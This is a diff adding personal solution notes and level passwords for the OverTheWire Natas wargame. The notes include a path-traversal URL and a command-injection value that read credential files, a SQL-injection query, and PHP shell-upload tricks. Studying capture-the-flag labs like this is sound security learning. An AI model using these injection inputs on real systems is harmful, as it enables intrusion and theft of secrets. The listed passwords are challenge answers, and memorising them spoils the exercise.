@@ -1,0 +1,56 @@
+Inspect element
+Level 0: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+ctrl+shift+i for inspect element
+Level 1: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
+using inspect element find that this path exists
+http://natas2.natas.labs.overthewire.org/files/users.txt
+Level 2: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+
+Inspect element: "Not even google can find"--> robots.txt
+http://natas3.natas.labs.overthewire.org/robots.txt
+Level 3: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+
+go to level 5. Add element with link to level 4. Press element.
+or use tamper data
+Level 4: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+change loggedin cookie to 1
+Level 5: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+
+just go to http://natas6.natas.labs.overthewire.org/includes/secret.inc
+Level 6: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+
+Try to open path using index.php by giving it file path
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+Level 7: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q 
+
+just use online php compiler: echo base64_decode(strrev(hex2bin($encodedSecret)));
+Level 8: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+
+php command executing bash, so just stop bash and use own command:
+; cat /etc/natas_webpass/natas10;echo
+Level 9: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+
+. /etc/natas_webpass/natas11
+Level 10: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+
+just decode it
+Level 11: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+
+upload php script (change extension from inspect element) that runs shell script and then open php script from webpage
+Level 12: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+
+Create jpg that has php code in it but only first bytes as jpg to trick it
+Level 13: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ  
+
+USE THIS URL
+http://natas14.natas.labs.overthewire.org/index.php?debug&username=test&password=test%22%20OR%20%221%22=%221
+execute this query
+SELECT * from users where username="test" and password="test" OR "1"="1"
+Level 14: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+
+%% brute force %%
+Level 15: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+
+%% brute force againnnn %%%
+Level 16: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
+
